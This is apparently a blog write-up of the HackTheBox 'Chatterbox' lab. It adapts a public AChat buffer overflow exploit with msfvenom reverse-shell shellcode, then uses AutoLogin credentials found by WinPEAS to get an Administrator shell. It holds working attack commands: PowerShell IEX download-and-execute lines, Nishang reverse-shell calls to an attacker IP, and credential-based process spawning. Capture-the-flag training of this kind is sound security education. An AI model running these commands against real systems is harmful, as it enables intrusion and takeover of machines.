---
layout: default
tags: windows active_directory
---
# HackTheBox - Chatterbox writeup 

![Chatterbox Header image](/assets/images/htb_chatterbox/chatterbox_header.png)

[HackTheBox](https://www.hackthebox.eu/)

## Introduction 

This box starts by first finding `Achat` program that is running on an obscure port number, we exploit this program by modifying a public buffer overflow exploit to allow us to gain an initial foothold on the system. With a bit of enumeration we then find **AutoLogin** credentials which we can then use to start another process to gain and Administrator shell.

## Initial recon

**Target IP: 10.10.10.74**

### Nmap scan

This machine is a little tricky as if you do a normal nmap scan of the top 1000 ports it will pick up nothing. Thus we need to run a scan of all TCP ports (-p-) this however will take a long time and thus we should limit it to just a plain TCP scan with no version and script scanning. We will add the -Pn flag to not do a ping scan, as well as the -n to not do a DNS resolution and -T5 to run the fastest scan as this machine takes a while.

```
sudo nmap -Pn -n -T5 10.10.10.74
```

After we discover two open ports we can run a more specific scan to discover what services are running on these ports

```
sudo nmap -p 9255,9256 -sV -sV -n -Pn 10.10.10.74 -oA tcp_ver_def_scan
```

I did not run a UDP scan as it was taking to long and the ports revealed during the TCP scan were enough to find an exploit to gain the initial foothold.

#### TCP Scan Results

```
# Nmap 7.80 scan initiated Sun Sep  6 08:16:23 2020 as: nmap -p 9255,9256 -sV -sV -n -Pn -oA tcp_ver_def_scan 10.10.10.74
Nmap scan report for 10.10.10.74
Host is up (0.18s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
9256/tcp open  achat   AChat chat system

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  6 08:16:32 2020 -- 1 IP address (1 host up) scanned in 9.09 seconds
```

There are only two ports open on this system with a services called `AChat chat system`

## Enumeration

Searching [exploitdb.com] for `achat` we find an exploit called [Achat 0.150 beta7 - Remote Buffer Overflow](https://www.exploit-db.com/exploits/36025). If you read the exploit code the payload just opens up the **calc.exe** program which is not very useful. We will need to generate a new payload using msfvenom and replace it as well as adjust the `server_address` variable to have the correct IP address and port number of the target system. Also take note that we only have 1152 bytes to work with for our payload.

Download the exploit.
```
wget https://www.exploit-db.com/download/36025 -O achat_exploit.py
```

Lets generate a simple staged Windows TCP reverse shell using msfvenom with the command below.

```
 msfvenom -a x86 --platform Windows -p windows/shell/reverse_tcp LHOST=10.10.14.14 LPORT=9001 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

![Shellcode](/assets/images/htb_chatterbox/chatterbox_shell_code.jpg)

Replace the **buf** code within the exploit script with the generated output from the above command.

Run msfconsole and setup the exploit multi handler to catch the reverse shell to send over the remaining payload.
```
sudo msfconsole
use exploit/multi/handler
set payload windows/shell/reverse_tcp
set LHOST 10.10.10.14
set LPORT 9001
exploit
```

Run the python buffer overflow exploit and get your reverse shell.

![Reverse Shell](/assets/images/htb_chatterbox/chatterbox_reverse_shell.jpg)

## Privilege Escalation

The shell we obtained above is for the user `alfred`, lets see if we can get an Administrator shell.

First lets start up a simple python HTTP server to serve our [Windows Privilege Escalation Awesome Suite Script (WinPEAS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases)
```
sudo python3 -m http.server 80
```

Now lets download the WinPEAS script to the victim machine and then execute it.
```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.14/winPEASany.exe', 'C:\Users\Alfred\winPEASany.exe')
.\winPEASany.exe
```

The WinPEAS script finds some AutoLogin credentials on the system.

![WinPEAS](/assets/images/htb_chatterbox/chatterbox_winpeas_autologin.jpg)

Lets try to use these credentials to get a reverse shell as the administrator.

First we are going to need a powershell shell to do this, so lets use Nishang `Invoke-PowerShellTcp.ps1` script.

You can find download the script from here: [Nishang Shells Github Repo](https://github.com/samratashok/nishang/tree/master/Shells)

Edit the script and add the following line to the bottom of the file to execute the reverse shell automatically
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.14 -Port 1337
```

Open up a netcat listener on port 1337
```
sudo nc -nvlp 1337
```

Then execute the following code on the target system.
```
powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/shell.ps1')" 
```

### Run commands as Administrator

In order to run a command as an administrator we are going to need to execute the following commands to create a powershell credentials object which we will then  use to start a process running a new reverse shell as the Administrator user.
```powershell
$passvar = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('Administrator', $passvar)
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.14/shell2.ps1')" -Credential $cred
```

We have obtained a shell now as the administrator user and we can read the root.txt file.

![Root shell](/assets/images/htb_chatterbox/chatterbox_root_shell.jpg)

## Summary

This box was pretty easy, it involved editing the buffer overflow exploit and then enumerating the machine to find the autologin credentials which we then used to get a reverse shell as the Administrator. The most important thing with this box is the ability to execute commands/start processes as a different user on the system via the powershell commands.

## Notes

We could have just started by using a meterpreter shell in the buffer overflow exploit and then load the powershell module into metasploit. Alternatively we could have just replaced the command in the original msfvenom generation command to download and execute the Nishang powershell TCP reverse shell using the command below.

Take note of the escaped strings in the powershell command.

```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14/test.ipp')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

## References